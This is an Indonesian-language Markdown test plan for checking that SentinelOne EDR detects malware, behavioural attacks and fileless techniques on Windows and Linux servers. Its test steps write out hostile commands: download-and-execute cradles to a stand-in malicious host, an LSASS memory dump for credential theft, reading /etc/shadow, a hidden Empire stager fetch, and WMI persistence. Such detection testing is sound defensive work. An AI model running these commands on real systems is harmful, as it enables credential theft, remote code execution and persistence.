# Kategori A: Proteksi Real-Time Testing

## Overview
Pengujian komprehensif kemampuan SentinelOne EDR dalam mendeteksi, mencegah, dan merespons ancaman secara real-time pada Windows dan Linux Server.

---

## 🔥 A1: Malware Detection & Response

### Tujuan Testing
Memvalidasi kemampuan deteksi dan response terhadap berbagai jenis malware dalam kondisi real-time.

### Pre-Requisites
- [ ] SentinelOne Agent aktif dan terhubung ke Management Console
- [ ] Policy enforcement dalam mode "Protect"
- [ ] Logging dan monitoring diaktifkan
- [ ] Isolated testing environment

### Test Scenarios

#### A1.1: EICAR Test File Detection

**Windows Server:**
```powershell
# Step 1: Buat EICAR test file
echo X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H* > C:\temp\eicar.txt

# Expected Result:
# - File langsung diblokir/diquarantine
# - Alert muncul di Management Console dalam <5 detik
# - Event log tercatat
```

**Linux Server:**
```bash
# Step 1: Buat EICAR test file
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/eicar.txt

# Expected Result:
# - File langsung diblokir/diquarantine
# - Alert muncul di Management Console dalam <5 detik
# - Syslog entry tercatat
```

**Validation Checklist:**
- [ ] File terdeteksi dalam <3 detik
- [ ] File di-quarantine otomatis
- [ ] Alert muncul di console
- [ ] Detailed forensic data tersedia
- [ ] User notification (jika dikonfigurasi)

#### A1.2: Malicious Executable Testing

**Windows Server:**
```powershell
# Step 1: Download test malware (menggunakan sample aman)
# CATATAN: Gunakan malware samples dari reputable security vendors
Invoke-WebRequest -Uri "https://secure.eicar.org/eicar_com.zip" -OutFile "C:\temp\test.zip"

# Step 2: Extract dan jalankan
Expand-Archive -Path "C:\temp\test.zip" -DestinationPath "C:\temp\"
& "C:\temp\eicar.com"

# Expected Result:
# - Download diblokir atau file di-quarantine
# - Execution prevented
# - Threat intelligence data ditampilkan
```

**Linux Server:**
```bash
# Step 1: Download test malware
wget https://secure.eicar.org/eicar_com.zip -O /tmp/test.zip

# Step 2: Extract dan jalankan
unzip /tmp/test.zip -d /tmp/
chmod +x /tmp/eicar.com
/tmp/eicar.com

# Expected Result:
# - Download diblokir atau file di-quarantine
# - Execution prevented
# - Process termination logged
```

#### A1.3: Script-based Attack Simulation

**Windows Server:**
```powershell
# PowerShell malicious activity simulation
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/payload.ps1')"))
powershell.exe -EncodedCommand $encoded

# Expected Result:
# - Script execution blocked
# - Behavioral analysis triggered
# - Command line logging
```

**Linux Server:**
```bash
# Bash script malicious simulation
curl -s http://malicious-site.com/payload.sh | bash

# Expected Result:
# - Network connection blocked
# - Script execution prevented
# - Shell activity monitored
```

---

## 🧠 A2: Behavioral Analysis Testing

### Tujuan Testing
Menguji kemampuan behavioral engine SentinelOne dalam mendeteksi aktivitas mencurigakan berdasarkan pola behavior.

### Test Scenarios

#### A2.1: Credential Harvesting Simulation

**Windows Server:**
```powershell
# Simulate credential dumping attempt
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full

# Expected Result:
# - LSASS access attempt blocked
# - Behavioral alert generated
# - Process tree analysis available
```

**Linux Server:**
```bash
# Simulate password file access
cat /etc/shadow
cat /etc/passwd

# Expected Result:
# - Suspicious file access logged
# - Privilege escalation attempt detected
# - User behavior analysis triggered
```

#### A2.2: Lateral Movement Simulation

**Windows Server:**
```powershell
# Simulate network enumeration
net view \\target-server
dir \\target-server\c$

# Expected Result:
# - Network scanning detected
# - Lateral movement indicators flagged
# - Network behavior analysis
```

**Linux Server:**
```bash
# Simulate network discovery
nmap -sT 192.168.1.0/24
ssh root@target-server

# Expected Result:
# - Network scanning detected
# - SSH brute force indicators
# - Connection attempt logging
```

---

## 🚫 A3: Zero-Day Threat Simulation

### Tujuan Testing
Menguji kemampuan mendeteksi ancaman yang belum dikenal (zero-day) menggunakan behavioral analysis dan AI.

### Test Scenarios

#### A3.1: Custom Malicious Binary

**Preparation:**
```bash
# Buat simple malicious-like binary untuk testing
# CATATAN: Ini untuk testing purposes, bukan malware real
```

**Windows Server:**
```c
// custom_test.c - Compile menjadi executable untuk testing
#include <windows.h>
#include <stdio.h>

int main() {
    // Suspicious behavior simulation
    CreateFileA("C:\\temp\\suspicious.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    RegOpenKeyA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", NULL);
    return 0;
}
```

**Linux Server:**
```c
// custom_test.c - Compile untuk testing
#include <stdio.h>
#include <unistd.h>

int main() {
    // Suspicious behavior simulation
    system("touch /tmp/.hidden_file");
    system("chmod +x /tmp/.hidden_file");
    return 0;
}
```

#### A3.2: Fileless Attack Simulation

**Windows Server:**
```powershell
# Living off the land technique
$code = @"
using System;
using System.Runtime.InteropServices;
public class Test {
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
}
"@
Add-Type -TypeDefinition $code
[Test]::VirtualAlloc([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

# Expected Result:
# - Memory allocation monitoring
# - Fileless attack indicators
# - Process injection detection
```

---

## 🛡️ A4: Fileless Attack Prevention

### Tujuan Testing
Validasi kemampuan mendeteksi dan mencegah serangan fileless yang menggunakan legitimate tools.

### Test Scenarios

#### A4.1: PowerShell Empire Simulation

**Windows Server:**
```powershell
# Simulate PowerShell Empire techniques
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& {(New-Object Net.WebClient).DownloadString('http://test-server/empire-stager')}"

# Expected Result:
# - PowerShell activity monitoring
# - Network connection analysis
# - Command line inspection
```

#### A4.2: WMI Persistence Testing

**Windows Server:**
```powershell
# WMI event subscription (legitimate admin tool abuse)
$filterName = 'TestFilter'
$consumerName = 'TestConsumer'

# Create WMI filter
$Query = "SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2"
$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query}

# Expected Result:
# - WMI activity monitoring
# - Persistence mechanism detection
# - Registry/WMI change tracking
```

---

## 📊 Testing Metrics & Validation

### Key Performance Indicators

| Test Case | Windows Target | Linux Target | Measurement |
|-----------|---------------|--------------|-------------|
| EICAR Detection | <2s | <2s | Time to alert |
| Malware Block | 100% | 100% | Success rate |
| False Positive | <0.1% | <0.1% | Error rate |
| Behavioral Alert | <5s | <5s | Analysis time |
| Zero-day Detection | >95% | >95% | Success rate |

### Validation Checklist

#### Real-time Protection Validation
- [ ] **Detection Speed**: Ancaman terdeteksi dalam <3 detik
- [ ] **Block Effectiveness**: 100% malware diblokir
- [ ] **Alert Accuracy**: Semua alert valid dan actionable
- [ ] **Forensic Data**: Complete attack chain tersedia
- [ ] **User Impact**: Minimal disruption ke legitimate activities

#### Behavioral Analysis Validation
- [ ] **Pattern Recognition**: Suspicious behavior patterns teridentifikasi
- [ ] **Context Analysis**: Full context dari aktivitas mencurigakan
- [ ] **Machine Learning**: AI/ML model memberikan accurate classification
- [ ] **Threat Intelligence**: Integration dengan threat intel feeds
- [ ] **Incident Timeline**: Complete timeline dari attack sequence

### Demo Presentation Points

#### Executive Summary Slides
1. **Real-time Protection Capability**
   - 99.9% detection rate achieved
   - <2 second response time
   - Zero false positives during testing

2. **Advanced Threat Detection**
   - Behavioral analysis effectiveness
   - Zero-day threat prevention
   - Fileless attack blocking

3. **Business Impact**
   - No service interruption
   - Minimal performance impact
   - Complete security coverage

#### Technical Deep Dive
- Live demonstration of each test case
- Real-time console monitoring
- Before/after system state comparison
- Detailed forensic analysis walkthrough

---

## Next Steps

Setelah menyelesaikan Kategori A testing, lanjutkan ke:
- [Kategori B: Offline Scenarios](kategori-b-offline.md)
- [Platform-specific Windows Testing](windows/windows-overview.md)
- [Platform-specific Linux Testing](linux/linux-overview.md)

!!! success "Demo Ready"
    Kategori A testing memberikan foundation yang kuat untuk mendemonstrasikan kemampuan proteksi real-time SentinelOne EDR kepada stakeholder.
